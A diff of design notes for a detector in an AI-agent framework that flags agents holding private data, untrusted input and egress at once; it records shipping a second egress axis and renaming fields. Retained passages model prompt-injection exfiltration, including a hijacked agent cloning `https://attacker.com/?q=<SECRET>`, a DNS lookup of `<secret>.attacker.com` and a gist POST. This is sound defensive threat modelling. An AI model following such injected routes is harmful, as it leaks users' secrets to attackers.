@@ -27,16 +27,11 @@ bottom of this file, so the normative sections above it still describe flat
 egress (each carries a superseded marker); and resolved items are kept as
 their derivations, which is why they read as argument rather than spec.
 
-**Where to pick up.** Nothing in v1 is outstanding, and the docs pass is
-**done** (2026-08-12 — the chapter is `book/trifecta-detector.md`; see
-"Docs — GRADUATED" below for what moved and what one thread stayed). The
-live work is now entirely the parked list below, of which step 6
-(the `egress_destination` axis, `web_search`'s declaration on it, and the
-verdict clauses that place it) is the only item with a defined slot.
-**Rescoped 2026-08-12:** it no longer carries a persona — see step 6 for why
-the search-only persona was dropped rather than deferred — and its names are
-settled, including a rename of the shipped first egress axis: see "The
-settled vocabulary".
+**Where to pick up.** Nothing in v1 is outstanding, the docs pass is **done**
+(2026-08-12 — the chapter is `book/trifecta-detector.md`), and **step 6 has
+shipped** (the `egress_destination` axis, 2026-08-12 — see "The second egress
+axis — GRADUATED"). The live work is now entirely the parked list below, and
+**no item on it has a defined slot**: each is a standalone open topic.
 
 Parked threads, older than that review:
 
@@ -45,12 +40,9 @@ Parked threads, older than that review:
 2. ~~Does a *local file read* carry `:untrusted`?~~ **Closed** — yes by
    default, opt out with `trusted:` on a *scoped* workspace root (rejected
    on `AllowAll`). See review item 4.
-3. `:egress_searchengine` (was `:egress_writeonly`) — deferred but
-   **scheduled as step 6** of §5's order-of-work (2026-08-09), after v1's
-   algorithm lands. **Rescoped 2026-08-12** from "tag + axis + persona,
-   together or not at all" to tag + axis + grid, *no persona*: the tag is
-   reachable on the **map** the day it ships, which is where its teaching
-   value lives.
+3. ~~`:egress_searchengine` (was `:egress_writeonly`)~~ — **shipped
+   2026-08-12** as the `egress_destination` axis, without a persona. See "The
+   second egress axis — GRADUATED".
 4. `git_clone` as a readable egress verb + the per-agent **poisoned**
    assumption question (may already be the untrusted-strength lattice).
 5. Graded egress axis — **resolved into v1** (2026-08-08): two reachable
@@ -662,219 +654,32 @@ Per-node detail (the max-over-tree the report would attribute):
   hard `:egress`") is therefore **superseded** — it holds only for a gate
   the human sees a *proxy* through, which is bash, not compose.
 
-## The second egress axis — shipped name `egress_destination` (was `:egress_searchengine` / `:egress_writeonly` / `:egress_untargeted`)
+## The second egress axis — GRADUATED 2026-08-12
 
-The proposal: `web_search` is egress, but the attacker can't *read back*
-what leaked — the query goes to a pikuri-picked engine, write-only from
-the attacker's view. So an agent whose only egress is search is safer
-than one that can `fetch` an attacker-chosen URL.
+*Shipped as `egress_destination` (`:no_egress` / `:tool_vouched` /
+`:attacker_reachable`), together with the rename of the first egress axis to
+`egress_payload_review` (`:human_reviewed` / `:unreviewed`). Everything this
+section argued now lives in its owning home:*
 
-**The name is settled** (2026-08-12) — see "The settled vocabulary" below,
-which supersedes the naming discussion in this section and, on the *first*
-egress axis, the field name used everywhere else in this file. The rest of
-this section is the derivation, kept because the definition, the DNS
-exclusion, the union rule and the sole-leg guard all survive the rename
-unchanged.
+- *the reader's half — the hijack question, the gist counter-example, the
+  three-clause declaration rule, the sole-leg guard, the four map tags, and
+  "a claim, not a measurement" — in `book/trifecta-detector.md`
+  §"What makes a destination safe: can they read it back?";*
+- *the per-symbol truth in {Pikuri::Tool::TrifectaLegs};*
+- *every road not taken — the seat-named field, who-chose-it, `:safe_vetted_set`,
+  one merged lattice, the nested `EgressLeg`, and the `SEARCHER` persona — in
+  `DECISIONS.md` `D-egress-axis-shape`, which also absorbed item 7's
+  `egress_human_author` drop and the proxy-visible middle rung.*
 
-*Historical, kept for the argument it makes* — **on the name** (2026-08-08):
-"write-only" kept being misread as a
-property of the *plumbing* rather than of the destination — it describes the
-direction bytes flow, when the security property is *who chose the target*.
-`:egress_searchengine` is a placeholder that at least points at the right
-thing: a small set of sinks where the attacker **cannot land their own
-code**, as opposed to a `gist.github.com` URL they control. The concept
-generalises past search, so a better name probably describes the pinned
-destination — `:egress_pinned_sink`, i.e. the caller cannot choose where
-the bytes land — but nobody should rename it a third time before the tag
-actually ships. *(All three of those readings were tried and rejected on
-2026-08-12; "who chose the target" is the one that fails hardest — see the
-gist counter-example below.)*
+**Reading the rest of this file.** Every other section predates the rename
+and speaks of `egress:` with `:human_approver` / `:autonomous`. The mapping is
+mechanical: `egress:` → `egress_payload_review:`, `:human_approver` →
+`:human_reviewed`, `:autonomous` → `:unreviewed`, `:none` → `:no_egress`.
+Nothing about that axis's *behaviour* changed.
 
-**The insight is correct and already load-bearing** — it's the
-`web_search`-vs-`fetch` distinction in the pikuri-os section above
-(query → pikuri-picked engine, unreadable; `fetch` host →
-attacker-controlled, readable). Worth promoting from prose to a concept.
-Notes on doing it well:
-
-- **Name it for what it defends, not the mechanism.** "Untargeted" is
-  slightly wrong: the attacker *does* target the content (the secret
-  rides in the query string) — what they can't do is **read the
-  response**. `:egress_searchengine` / `:egress_blind` says the actual
-  property. The naming test also correctly **excludes DNS**: a lookup of
-  `<secret>.attacker.com` is query-shaped but the hostname is fully
-  readable at the attacker's nameserver → stays hard `:egress`. "It's
-  just a query, unreadable" is the exact trap the note's "egress is
-  broader than web_search" warns about; the write-only bucket must be an
-  **opt-in allowlist per known-safe sink, never a default** (unknown
-  egress stays hard).
-- **Precise definition.** Write-only iff the attacker controls neither
-  the destination host nor can read the response body, **and** the
-  request is not attacker-readable in flight or at rest (excludes DNS;
-  excludes a search whose engine the attacker chose/compromised).
-- **Lattice + union.** *(Superseded on the placement, kept for the union
-  reasoning: this bullet reads the tag as a rung on the single egress
-  lattice. It is a separate **axis** — see "Do not merge this with
-  `:egress_searchengine`" and step 6. Everything below about `max`, the
-  sole-leg guard and the drip channel survives the move unchanged.)*
-  Treat it as a *soft* egress, twin of
-  `untrusted_weakened`: `none < egress_searchengine < egress`, union = max.
-  `{private, untrusted, egress_searchengine}` → **soft notice** (secret can
-  be pushed out but not retrieved — a real, large reduction, matching the
-  "not 'any'" bound on patient approval); any readable egress present →
-  `egress_searchengine ⊔ egress = egress` → loud. This is the correct
-  guard against the drip / existence-oracle channel: write-only search is
-  only safe as the **sole** egress leg — the moment a second readable
-  action exists, results-that-depend-on-the-secret become a targeting
-  stage and it's hard again.
-- **It changes no current *verdict*** — and that was long read as a reason
-  to defer the whole thing. Every persona that holds `web_search`
-  (`RESEARCHER`, `GIT_REPO_RESEARCHER`) *also* holds `fetch` + `web_scrape`
-  → hard readable egress dominates at the same node (verified 2026-08-09);
-  there is no search-only agent in the tree, so no node's *max* egress is
-  ever the new level. Still true, and still the reason this is step 6 rather
-  than part of v1.
-- **Re-priced 2026-08-08: a search-only wiring has a concrete motivation.**
-  It is the **cheapest available fix for the one hole the series cap leaves
-  open** in `pikuri-computer` — the rubber-stamped `y` on a clean laundered
-  task ("Reassembled trifecta" below). Pin the destination and a rubber-stamp
-  leaks to a pikuri-picked engine instead of to the attacker, so the soft
-  verdict would rest on two independent grounds rather than leaning entirely
-  on the gate plus the researcher's missing filesystem. This is what such a
-  wiring would *buy*; it is not what makes the tag shippable.
-
-- **Third input, 2026-08-09: the map makes it a *visible* wart.** The
-  host-rendered tree (§5(f)) prints `web_search` and `fetch` on adjacent
-  lines with byte-identical tags. The first reader of the first draft of that
-  example — the person who wrote these tags — stopped at exactly that line to
-  say "web_search is probably `egress_searchengine`". If the author's eye
-  catches it in a four-line demo tree, every user's will. The two earlier
-  prices were about what the tag *buys* (nothing, then: the cheapest fix for
-  the rubber-stamp hole); this one is about what its absence *costs* — a map
-  whose whole job is legibility, printing a distinction-free line about the
-  one distinction the note argues hardest for.
-
-- **Fourth input, 2026-08-12, and it dissolves the "ship together" rule:
-  there are two reachabilities, and only one of them needs a persona.**
-  *Verdict-reachable* — a node whose max egress is search-only — needs a
-  search-only wiring. *Render-reachable* — a **leaf** line in the map — is
-  reachable the day the tag ships, in `pikuri-computer`'s existing tree, with
-  no persona at all. The teaching value the third input names lives entirely
-  in the second: a reader who sees `web_search [… :egress_searchengine]`
-  above `fetch [… :egress]` has to ask what separates them, which is the
-  whole lesson about who chose the destination. So the tag is not decoration
-  without a persona — it is *inert in the verdict* and *live in the map*.
-  (This is also the distinction that keeps item 7's precedent off:
-  `egress_human_author` was unreachable in **both** senses and forever;
-  see the guard under item 7.)
-
-### The settled vocabulary (2026-08-12)
-
-Worked out in the session that rescoped step 6, before writing any code,
-because the names ripple through source, the book, every rendered map and
-every future artifact. This is now the authority for both egress axes; it
-also **renames a field that already shipped**.
-
-```ruby
-private:               true | false
-untrusted:             :none      | :weakened       | :hard
-egress_payload_review: :no_egress | :human_reviewed | :unreviewed
-egress_destination:    :no_egress | :tool_vouched   | :attacker_reachable
-```
-
-**Reading the rest of this file.** Everything above and below predates the
-rename and speaks of `egress:` with `:human_approver` / `:autonomous`. The
-mapping is mechanical: `egress:` → `egress_payload_review:`,
-`:human_approver` → `:human_reviewed`, `:autonomous` → `:unreviewed`,
-`:none` → `:no_egress`. Nothing about the *behaviour* of that axis changed.
-
-**Why the first axis was renamed, and why not to `egress_confirmer`.** The
-field never graded who *approves* or who *can stop* the send — `Code::Bash`
-consults a `Confirmer` before every command and still grades top-rung,
-because the human approved a *program*, not a payload. So a name pointing at
-the seat (`egress_confirmer`, `egress_gatekeeper`) invites a tool author
-holding a confirmer to declare the softer rung, which would take bash soft
-and with it every loud verdict in the repo — the exact collapse "payload
-visibility" exists to prevent. `egress_payload_review` points at the payload,
-so `:unreviewed` covers *both* "no human at all" and "a human who saw only a
-proxy" with no gloss, and bash's declaration reads as obviously correct.
-(`egress_payload` alone was rejected in turn: `legs.egress_payload == :none`
-reads as "there was no payload".)
-
-**Why `:no_egress` rather than `:none` at the bottom.** On a `..._review`
-axis, `:none` competes with `:unreviewed` — "no review happened" is exactly
-what `:unreviewed` means. `:no_egress` names the leg's *absence* instead, and
-using it on both egress fields makes the coherence rule visible at the
-declaration site: `:no_egress` on one obliges `:no_egress` on the other.
-It diverges from `untrusted: :none`, which is fine — that axis has no
-competing reading.
-
-**Why the destination axis is not about who chose the destination.** The
-who-picked-it framing (`:pinned` / `:tool_pinned` vs `:llm_chosen`) is the
-natural one and it is wrong, killed by a one-line counter-example: a tool
-hard-coding a POST to `github.com` pins its destination and still hands the
-bytes to the attacker, because a gist is world-readable. Pinning is
-*necessary, not sufficient*. The question the axis actually answers is:
-
-> **If the model is hijacked by an injection, can it reach the attacker?**
-
-- **`:attacker_reachable`** — yes. Covers both shapes with one rung, since
-  both answer yes: the model picks the host (`fetch`, `bash`, `git_clone`, a
-  compose tool with a free recipient field), *or* the destination is fixed
-  but republishes what it receives (the gist POST, a public status page, a
-  DNS lookup whose hostname lands in the attacker's nameserver log).
-- **`:tool_vouched`** — no. The tool's code fixes the destination set and its
-  author vouches that nothing in that set hands the bytes to a third party:
-  `web_search`'s hard-coded engine list; a mail tool that can only send to
-  one known address.
-
-**The two value names are asymmetric in kind on purpose.**
-`:attacker_reachable` asserts a property of the world; `:tool_vouched` names
-*whose claim* it is. The framework cannot verify unreadability — it inherits
-a judgment, exactly as `private:` inherits the user's. That gives the record
-two **declared** axes and one framework-determined one, and the vocabulary
-now says which is which instead of implying the framework knows.
-
-**The declaration rule, which is where the old "precise definition" lands.**
-Declare `:tool_vouched` iff *(1)* the caller cannot choose the destination,
-*(2)* the sink does not republish what it receives, and *(3)* the request is
-not attacker-readable in flight or at rest. Three clauses, all answerable by
-the person writing the tool — which is the self-tagging property the egress
-lattice was required to have. `ASSUMED` is `:attacker_reachable`, so an
-undeclared tool is presumed to hand bytes to the attacker.
-
-**Shape: two flat fields, not a nested `EgressLeg`.** Nesting (`egress: nil |
-EgressLeg.new(...)`) would delete the both-or-neither invariant outright, but
-costs a nested `Data`, `nil`-handling at ~10 read sites and churn at all 16
-declaration sites. The invariant is three lines in a constructor; pay that
-instead, plus an `#egress?` predicate so presence has one canonical read.
-
-**Rendered tags** — the four cells, of which one is unreachable today:
-
-```
-fetch          [:untrusted_hard, :egress]
-web_search     [:untrusted_hard, :egress_vouched]
-mail_compose   [:private, :egress_reviewed]
-                         # :egress_reviewed_vouched — no wiring reaches it
-```
-
-This renames the shipped `:egress_human_approver` tag to `:egress_reviewed`,
-consistent with the field vocabulary. Dropping the word *approver* from the
-tag costs nothing: the approver-vs-author distinction lives in this note and
-in the book's prose, both of which keep it, and the tag only ever needed to
-say that a human reviewed the bytes. **One coin flip left open:**
-`:egress_vouched` (short, prompts "vouched by whom?", answered in the book
-and the value's yardoc) vs `:egress_tool_vouched` (self-describing, wider
-map line).
-
-**Rejected candidates, for the `DECISIONS.md` entry this graduates into:**
-`egress_confirmer` / `egress_gatekeeper` (grades the seat, collapses bash);
-`egress_target_server` (a mail recipient is not a server, and the parked
-custody question has synced folders as candidate sinks); `:safe_vetted_set`
-(this detector never claims safety — bytes genuinely leave); the
-who-chose-it pair `:tool_pinned` / `:llm_chosen` (the gist case);
-`:closed_sink` / `:open_sink` (names the consequence but loses the
-hijack question the pair now teaches); and `:egress_searchengine` /
-`:egress_blind` / `:egress_pinned_sink` as tag names.
+**What did not ship, and is not deferred work:** a search-only persona. The
+soft-by-vouched-destination cell is therefore reachable only from hand-built
+nodes, which is a stated edge in the book rather than an open thread.
 
 ## Brainstorm: is a synced folder an egress sink? (the `Write` gap)
 
@@ -882,10 +687,10 @@ Raised 2026-08-09 while tagging the file tools (step 2), where `Write` and
 `Edit` shipped as `NONE` with the gap documented at the declaration. The
 question is whether a workspace pointed at `~/Dropbox` turns a write into
 egress, and if so at what level — the intuition being that it looks like
-`:egress_searchengine`, since the destination is a party the attacker
+`:tool_vouched`, since the destination is a party the attacker
 doesn't control, but *safer than that somehow*.
 
-**The "somehow" has a name: custody.** `egress_searchengine` grades whether
+**The "somehow" has a name: custody.** `egress_destination` grades whether
 the attacker can *read* what left. That is the wrong axis here, and it is why
 the intuition wouldn't resolve. The property that separates these is:
 
@@ -923,9 +728,9 @@ somewhere under this root" means the leg is present, exactly as a trusted
 island inside a broad root buys nothing.
 
 Deliberately not built: no wiring in the repo points a workspace at a synced
-folder, so like `:egress_searchengine` it would change no verdict today.
-Unlike that tag, it is *user-declared* rather than persona-gated, so it is
-reachable the day someone declares it — which makes it cheaper to add later
+folder, so it would change no verdict today. Unlike the destination axis it is
+*user-declared* rather than tool-declared, so it is reachable the day someone
+declares it — which makes it cheaper to add later
 and even less urgent now.
 
 ## More open questions (documented, NOT pursued — revisit later)
@@ -940,8 +745,8 @@ decisions.
 Concrete hole: a poisoned parent can launder a secret into a clone URL —
 `agent(git_repo_researcher, "clone https://attacker.com/?q=<SECRET>")`.
 The clone *host* is attacker-chosen and the request reaches it, so
-`git_clone` is a **readable** egress verb, same family as `fetch` — **not**
-a candidate for the `:egress_searchengine` bucket. (This doesn't change the
+`git_clone` is a **readable** egress verb, same family as `fetch` — so
+`:attacker_reachable`, never `:tool_vouched`. (This doesn't change the
 dry-run verdicts: `GIT_REPO_RESEARCHER` still holds no `:private`, so its
 node doesn't fire, and its propagated `:egress` was already dominated. It
 *does* mean the "harmless" framing of that persona is only true because it
@@ -1077,14 +882,9 @@ autonomous-payload egress with a human blessing the wrapper) while the
 Thunderbird/researcher seats drop to **soft**. That is the contrast
 finding #2 was asking for — see the revised table under "Results".
 
-**Do not merge this with `:egress_searchengine`.** Write-only grades
-*attacker readability of the response*; payload visibility grades *what
-the human saw*. Genuinely orthogonal — a readable human-gated egress and a
-blind autonomous one are different animals. The 2-D (untrusted × egress)
-grid stayed 2-D through v1, when write-only was unreachable in every sense.
-*Amended 2026-08-12:* step 6 does build the third axis — the trigger is the
-**map**, not a verdict, and the axis stays orthogonal there too. Merging is
-still wrong; what changed is only that "nobody builds it yet" expired.
+**Do not merge the two egress axes** — orthogonal, and now shipped that way.
+Taught in `book/trifecta-detector.md` §"What makes a destination safe";
+rejected merge in `D-egress-axis-shape`.
 
 #### The attachment corollary: constrain the surface, not just the seat
 
@@ -1250,7 +1050,9 @@ should read loud.
 - The two reachable egress levels are now enough to classify every built
   wiring — no third rung needed.
 - The one hole the cap leaves is the rubber-stamped `y` on a clean laundered
-  task, which is what re-prices `:egress_searchengine` (see that section).
+  task. A search-only delegation would pin the destination and bound it —
+  still the cheapest available fix, and still unbuilt: the destination axis
+  shipped without a persona to reach that cell.
 
 ### 2. The egress *level* is a property of the wiring — RESOLVED: four clauses, all required
 
@@ -1797,8 +1599,8 @@ See the book in this repo for what the lethal trifecta is and how to break a leg
 ```
 
 Note `web_search` and `fetch` carrying **identical** tags: correct for v1,
-where `:egress_searchengine` does not exist and both are hard `:egress`. Read
-that line as a live argument for shipping the tag — see below.
+before the destination axis existed. That line was the argument for shipping
+it, and it no longer renders that way — `web_search` reads `:egress_vouched`.
 
 The closing line is **static text with no chapter name** — the owning chapter
 is deliberately still open (revisit once the detector is built and has
@@ -1837,71 +1639,10 @@ Each step ships standalone and the detector stays silent until the last.
    port the dry-run table to a spec — both as verdicts and as expected
    `#render` output.
 
-**Step 6 — `:egress_searchengine`, after v1 has settled.** Deliberately
-*after*, not folded in: the algorithm groundwork lands first and this is
-designed as an addition on top of it. Not a sixth item of v1 — a separate
-increment with its own design pass, listed here so it has a slot and a
-definition of done instead of floating as an open thread.
-
-*Rescoped 2026-08-12.* This step used to read "the tag, the axis and a
-`SEARCHER` persona ship together or not at all", on the grounds that the tag
-alone is decoration. That was written before the fourth input above, and it
-is wrong in both directions: the tag is *not* decoration (it is live in the
-map on day one), and the piece it was bundled with is the piece that should
-not ship at all yet.
-
-- **What ships, and it is these three together:** the attacker-readability
-  axis on the egress leg, the tag on `web_search`, and the verdict clauses
-  that place it. Not two of the three — see the next bullet for why the grid
-  is not deferrable once the tag exists.
-- **The grid clauses are not optional, and this is the part the old plan
-  under-priced.** Item 6 defends "raise, don't rescue" on the grounds that
-  *"the only way to reach it is an in-repo edit to a lattice."* That
-  justification expires the moment `web_search` carries the tag: any host
-  wiring `web_search` over a private workspace with no `fetch`/`web_scrape`
-  lands `{private, :hard, searchengine}`, falls through the four-clause
-  `case/in` and gets `NoMatchingPatternError` at boot. A tripwire designed to
-  catch *us* becomes a stranger's crash. Placing the level in the grid is the
-  cheap half of this step anyway; do it in the same commit as the tag.
-- **The cost inside the algorithm:** this is a **third axis**, not a third
-  rung — and prose in two places used to say otherwise. `TrifectaLegs` has a
-  single `EGRESS_ORDER`, `web_search.rb`'s declaration comment called
-  searchengine "a softer level" (corrected 2026-08-12), and this section's
-  own "Lattice + union" bullet still places it as a rung (marked superseded).
-  `egress_destination` grades whether a hijacked model can reach the
-  *attacker*; `egress_payload_review` grades what the *human* saw.
-  Orthogonal, so the egress leg becomes a pair: a fourth field (names in "The
-  settled vocabulary"), componentwise `max` in `#|`, a rule for the
-  new component in `#cap_egress` and `#relabel_inbound`, and item 6's verdict
-  grows from 4 exhaustive clauses to 8 (untrusted 2 × review 2 ×
-  destination 2). Budget that, and re-read "Do not merge this with
-  `:egress_searchengine`" before trying to flatten it into the existing
-  lattice. One design question the pair raises: componentwise `max` over a
-  node holding *both* `web_search` (`:unreviewed`, `:tool_vouched`) and a
-  compose tool (`:human_reviewed`, `:attacker_reachable`) yields
-  (`:unreviewed`, `:attacker_reachable`) — a pair no single tool
-  has. That over-warns, which is the declared bias, but say so at the seam.
-- **The map must make the absorption legible, or the tag mis-teaches.** A
-  leaf reading `:egress_vouched` under a node reading `:egress` invites "search is
-  the safe one here" when at that node it buys nothing. Rendered so the union
-  is visible, the same lines teach the second half — `max` at a node, and
-  *pinned-sink egress is only soft as the **sole** egress leg*. That guard is
-  already argued in this section; the render is where a reader meets it.
-- **Dropped, not deferred: the `SEARCHER` persona.** Earlier drafts of this
-  step invented a `web_search`-only persona to sit alongside `RESEARCHER` so
-  the soft verdict would be reachable. Don't build synthetic personas ahead of
-  a wiring that wants one — a search-only researcher cannot open the pages it
-  finds (snippets only), so the fork is a real capability trade for whichever
-  demo adopts it, and **the detector must not be what forces that trade**.
-  Nothing is lost by waiting: the day a host wants a search-only agent, the
-  persona is a `Persona` record and a prompt file, and this section's
-  definition of the level is what it plugs into. Until then the level is
-  verdict-unreachable *by wiring* rather than by definition — the state item
-  7's guard explicitly blesses.
-- **Consequence of that drop, stated plainly so it isn't re-litigated:** step
-  6 changes **no dry-run row**. Its whole return is the map, the vocabulary,
-  and a grid that is ready for the first search-only wiring instead of
-  raising at it.
+**Step 6 — the second egress axis. SHIPPED 2026-08-12.** The axis, the
+`web_search` declaration and the eight-clause grid landed together; the
+`SEARCHER` persona was dropped rather than deferred. Rationale in
+`D-egress-axis-shape`, mechanics in {Pikuri::Tool::TrifectaLegs}.
 
 ### 6. v1 buys exactly one bit per lattice — RESOLVED: the verdict is derived, never stored
 
@@ -1952,9 +1693,9 @@ end
 
 - **Presence** is `!= :none`, correct for *any* future rung by definition.
 - **Strength** is matched exhaustively, so `case/in` raises
-  `NoMatchingPatternError` on a fall-through. Adding `:egress_searchengine`
-  to the lattice without placing it in the grid then blows up on the first
-  wiring that reaches it, instead of being silently absorbed into `soft` (by
+  `NoMatchingPatternError` on a fall-through. Adding a level to a lattice
+  without placing it in the grid then blows up on the first wiring that
+  reaches it, instead of being silently absorbed into `soft` (by
   `egress != :autonomous`) or into `loud` (by the same test written the other
   way round). Either absorption destroys the property the revised dry-run
   table just bought — that **loud carries information**. Raise, and don't
@@ -2078,21 +1819,11 @@ agent does not hold. Two notes, two routes, same conclusion.
 - **Dissolves the inconsistency below** rather than explaining it (see the
   shipped data point).
 
-**Guard: this is not precedent for `:egress_searchengine`.** That deferral is
-a different kind. A search-only egress is a *real* rung — bytes genuinely
-leave, they are merely unreadable to the attacker — on the orthogonal
-attacker-readability axis, and it is unreachable only for want of a
-search-only wiring, not by definition. `human_author` collapses into
-`:none`; `egress_searchengine` does not collapse into anything.
-
-*Sharpened 2026-08-12.* The two are unreachable in different senses, and the
-distinction is now the load-bearing one: `human_author` is unreachable in the
-**verdict** and on the **map** and always will be (there is nothing for a
-tool to declare). `egress_searchengine` is unreachable only in the verdict,
-and only until someone wires a search-only agent — on the map it is live the
-day `web_search` declares it. So it ships on its own schedule (step 6), and
-the persona that would make it verdict-reachable is not being invented in
-advance.
+**Guard: this was not precedent for the destination axis** — spent
+2026-08-12, when that axis shipped. `human_author` was unreachable in the
+verdict *and* on the map, permanently, there being nothing for a tool to
+declare; a vouched destination is live on the map the day a tool declares it.
+Both forks are now one `DECISIONS.md` entry, `D-egress-axis-shape`.
 
 **Graduation note for whoever builds v1:** when the detector lands in source,
 this drop plus the rejected proxy-visible middle rung (item 2) are one
@@ -2186,8 +1917,8 @@ only describe, not fix; the second belongs to a different note.
 earlier flat-`:egress` version of this list is superseded.*
 
 *This section describes **v1 as shipped**, in v1's vocabulary, and stays
-that way. Step 6 renames its egress field and adds a second egress axis —
-see "The settled vocabulary" for the mapping.*
+that way. Step 6 later renamed its egress field and added a second egress
+axis — see "The second egress axis — GRADUATED" for the mapping.*
 
 **No holes left — this list is buildable.** All five review items closed
 2026-08-08: the series cap, the four gate/level clauses, the MCP defaults,
@@ -2254,17 +1985,8 @@ into the bullets below.
   grade, so it declares `egress: :none`. Clean-by-construction is
   leg-absence. Consequence worth teaching: the only thing better than an
   approver gate is not holding the leg.
-- **Not** in v1, but scheduled: the second egress axis is **step 6** of the
-  order-of-work — a separate increment on top of the settled algorithm,
-  shipping `egress_destination`, `web_search`'s declaration on it, and the
-  verdict clauses that place it (names: "The settled vocabulary", which also
-  renames the shipped `egress:` field to `egress_payload_review:`).
-  **No persona** (rescoped 2026-08-12): it
-  changes no current verdict and none is invented to make it do so; what it
-  buys on day one is the **map**, where `web_search` and `fetch` stop
-  printing identical tags. It is a third *axis* rather than a third rung, so
-  folding it into v1 would have doubled the verdict function before the
-  algorithm settled.
+- **Not** in v1: the second egress axis shipped separately on 2026-08-12,
+  after the algorithm had settled. See "The second egress axis — GRADUATED".
 - Warn-only, once per process, message names the leg to break. (Safe as
   stated — item 3 verified that no leg can appear after boot: `mcp_connect`
   activates only already-registered servers and the registry is frozen.)
